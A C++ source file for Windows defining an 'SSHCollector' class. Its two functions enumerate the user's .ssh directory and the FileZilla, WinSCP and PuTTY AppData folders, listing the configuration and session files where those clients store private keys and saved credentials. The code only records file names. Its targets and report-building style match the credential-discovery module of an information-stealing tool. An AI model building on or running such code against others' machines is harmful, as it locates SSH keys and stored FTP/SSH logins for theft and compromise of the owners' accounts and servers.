#include "ssh_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <iostream>
#include <sstream>
#include <filesystem>
#include <fstream>
#include <vector>

std::string SSHCollector::CollectSSHKeys() {
    std::ostringstream result;
    result << "\n=== SSH KEYS ===\n";
    
    char userprofile[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, SHGFP_TYPE_CURRENT, userprofile);
    
    std::string sshPath = std::string(userprofile) + "\\.ssh";
    if (std::filesystem::exists(sshPath)) {
        result << "SSH directory: " << sshPath << "\n";
        try {
            for (auto& p : std::filesystem::directory_iterator(sshPath)) {
                if (p.is_regular_file()) {
                    result << "  - " << p.path().filename().string() << "\n";
                }
            }
        } catch (...) {
            result << "  Access denied\n";
        }
    } else {
        result << "No .ssh directory found\n";
    }
    
    return result.str();
}

std::string SSHCollector::CollectFTPSessions() {
    std::ostringstream result;
    result << "\n=== FTP CLIENTS ===\n";
    
    char appdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appdata);
    
    std::vector<std::pair<std::string, std::string>> clients = {
        {"FileZilla", std::string(appdata) + "\\FileZilla"},
        {"WinSCP", std::string(appdata) + "\\WinSCP"},
        {"PuTTY", std::string(appdata) + "\\PuTTY"}
    };
    
    for (const auto& [name, path] : clients) {
        if (std::filesystem::exists(path)) {
            result << name << ": Found\n";
            try {
                for (auto& p : std::filesystem::recursive_directory_iterator(path)) {
                    if (p.is_regular_file()) {
                        std::string ext = p.path().extension().string();
                        if (ext == ".xml" || ext == ".ini" || ext == ".dat") {
                            result << "  - " << p.path().filename().string() << "\n";
                        }
                    }
                }
            } catch (...) {
                result << "  Access denied\n";
            }
        }
    }
    
    return result.str();
}
